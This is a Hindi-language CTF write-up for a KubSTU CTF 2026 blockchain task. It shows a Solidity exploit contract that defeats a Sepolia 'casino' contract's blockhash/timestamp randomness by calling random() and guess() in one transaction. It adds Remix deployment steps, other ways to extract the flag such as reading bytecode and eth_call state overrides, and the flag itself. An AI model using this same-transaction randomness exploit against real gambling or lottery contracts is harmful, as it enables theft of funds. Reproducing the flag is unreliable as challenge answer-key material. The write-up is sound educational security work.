# WEB-3 कैसीनो

> **श्रेणी:** Blockchain · **इवेंट:** KubSTU CTF 2026 Autumn

## 📌 कार्य

### दिया गया

नेटवर्क: Ethereum Sepolia

Challenge contract:

```text
0xa8d58d2C110e84C5De16ce9530557a8f38137bCb
```

फ़्लैग प्रारूप:

```text
KubSTU{...}
```

**फ़ाइलें:** [task.txt](../../../assets/Web/Web-3%20%D0%9A%D0%B0%D0%B7%D0%B8%D0%BD%D0%BE/task.txt)

## 🏁 समाधान

### विचार

कॉन्ट्रैक्ट एक संख्या का अनुमान लगाने को कहता है:

```solidity
guess(uint8 answer)
```

अगर `answer == random()`, तो पता (address) solved के रूप में चिह्नित हो जाता है और `getFlag()` कॉल कर सकता है।

समस्या यह है कि `random()` ब्लॉक के सार्वजनिक डेटा से गणना की जाती है:

```solidity
blockhash(block.number - 1)
block.timestamp
```

यह असली यादृच्छिकता नहीं है। एक दूसरा कॉन्ट्रैक्ट एक ही ट्रांज़ैक्शन में `random()` कॉल करके सही उत्तर पा सकता है और उसे तुरंत `guess()` में भेज सकता है।

### Exploit

Remix में एक फ़ाइल `BadRandomnessExploit.sol` बनाते हैं:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBadRandomnessChallenge {
    function guess(uint8 answer) external;
    function random() external view returns (uint8);
    function getFlag() external view returns (string memory);
}

contract BadRandomnessExploit {
    function solve(address challenge) external {
        uint8 answer = IBadRandomnessChallenge(challenge).random();
        IBadRandomnessChallenge(challenge).guess(answer);
    }

    function getFlag(address challenge) external view returns (string memory) {
        return IBadRandomnessChallenge(challenge).getFlag();
    }
}
```

### Remix के ज़रिए समाधान

1. `https://remix.ethereum.org/` खोलें।
2. `BadRandomnessExploit.sol` फ़ाइल बनाएँ।
<img width="1378" height="560" alt="image" src="https://github.com/user-attachments/assets/56c39d40-d5d7-49f3-a45c-eee582394ced" />
3. कॉन्ट्रैक्ट को कंपाइल करें।
<img width="1243" height="480" alt="image" src="https://github.com/user-attachments/assets/d735c22d-89c3-416e-914f-d9aa5e65c40c" />
5. `Deploy & Run Transactions` टैब में `Injected Provider - MetaMask` चुनें

6. MetaMask एक्सटेंशन इंस्टॉल करें, `Sepolia` नेटवर्क चुनें और किसी faucet से कुछ सिक्के प्राप्त करें (उदाहरण faucet - https://sepolia-faucet.pk910.de/ )

<img width="730" height="521" alt="image" src="https://github.com/user-attachments/assets/c33479ce-ecc1-41eb-a662-25e756cf8c41" />

7. `BadRandomnessExploit` को डिप्लॉय करें।
<img width="2550" height="1320" alt="Безымянный" src="https://github.com/user-attachments/assets/cd6eea0b-63ee-421b-8dd0-6c09cbd673fe" />

8. कॉल करें:

```text
solve(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```

9. सफल ट्रांज़ैक्शन के बाद कॉल करें:

```text
getFlag(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```
<img width="2550" height="857" alt="Безымянный" src="https://github.com/user-attachments/assets/7f8f2e8f-7f9f-4b08-a46b-215f9abd575f" />

### फ़्लैग

```text
KubSTU{bad_randomness_same_tx}
```

---

### सामुदायिक राइटअप (टीम mpei_larpers)

> **स्रोत:** https://ctftime.org/writeup/41126 (CTFtime, उपयोगकर्ता राइटअप) · **इवेंट:** KubSTU CTF 2026: Autumn

Sepolia पर कॉन्ट्रैक्ट 0xa8d58d2C110e84C5De16ce9530557a8f38137bCb डिप्लॉय किया गया है — एक «कैसीनो» जहाँ फ़्लैग «संख्या का अनुमान लगाओ» खेल के पीछे छिपा है। `guess(uint8 answer)` उत्तर को केवल तभी स्वीकार करता है जब वह इसके बराबर हो

uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))

और तब खिलाड़ी को `solved` में चिह्नित करके `getFlag()` खोल देता है। इस «यादृच्छिक» संख्या के दोनों इनपुट (पिछले ब्लॉक का हैश और टाइमस्टैम्प) पूरे ब्लॉक के भीतर नहीं बदलते, इसलिए संख्या पूरी तरह पूर्वानुमेय है। एक हमलावर कॉन्ट्रैक्ट `random()` कॉल करता है और तुरंत उसी मान के साथ एक ही ट्रांज़ैक्शन में `guess(...)`: दोनों कॉल एक ही ब्लॉक देखते हैं, जाँच हमेशा पास होती है। जबकि «एक ट्रांज़ैक्शन में मान पढ़ो, अगली में अनुमान लगाओ» वाली योजना काम नहीं करती — ब्लॉक अब अलग है। यही इस कार्य का सार है; one-transaction पैटर्न यहाँ कोई तरकीब नहीं, बल्कि इरादा (intent) है।

फ़्लैग, हालाँकि, «जीतना» भी नहीं पड़ा — वह सीधे कॉन्ट्रैक्ट के रनटाइम-कोड में पड़ा है। मैंने उसे तीन स्वतंत्र तरीकों से निकाला, सभी ने एक ही स्ट्रिंग दी:

1. `eth_getCode` — फ़्लैग का लिटरल बाइटकोड में जड़ा है (ऑफ़सेट 0x1fd पर PUSH32, लंबाई 0x1e, यह ठीक वही है जो `getFlag()` लौटाता है)। सार्वजनिक ब्लॉकचेन पर «private» जैसा कुछ नहीं होता।
2. `eth_call getFlag()` एक state override के साथ, जो हमारे पते को solved के रूप में चिह्नित करता है: जीवित कॉन्ट्रैक्ट स्वयं अपनी success-शाखा निष्पादित करके फ़्लैग दे देता है। override के बिना वही कॉल `Solve first ` के साथ रिवर्ट हो जाता है।
3. एक Foundry फ़ोर्क-टेस्ट जो ईमानदार एक्सप्लॉइट (`random()` कॉल करो, अनुमान लगाओ, `getFlag()`) को असली deployed-कोड के विरुद्ध दोहराता है: `[PASS]`, लॉग में फ़्लैग।

कहीं भी प्राइवेट की, faucet और फ़ंडेड अकाउंट की ज़रूरत नहीं पड़ी। साथ ही पूर्वानुमेयता को लाइव दिखाया: ब्लॉक 11883331 के लिए `random()` का मान = 62; `eth_call guess(62)` पास होता है, जबकि नियंत्रण `guess(63)` `Wrong guess` के साथ रिवर्ट हो जाता है। यह वही oracle है जो हमलावर कॉन्ट्रैक्ट एक ही ट्रांज़ैक्शन के भीतर देखता है।

डिस्पैचर से मिलान करने हेतु सेलेक्टर: getFlag()=0xf9633930, guess(uint8)=0x4ba4c16b, random()=0x5ec01e4d, solved(address)=0x5e36bdc6.

फ़्लैग: `KubSTU{bad_randomness_same_tx}`

**फ्लैग:** `KubSTU{bad_randomness_same_tx}`
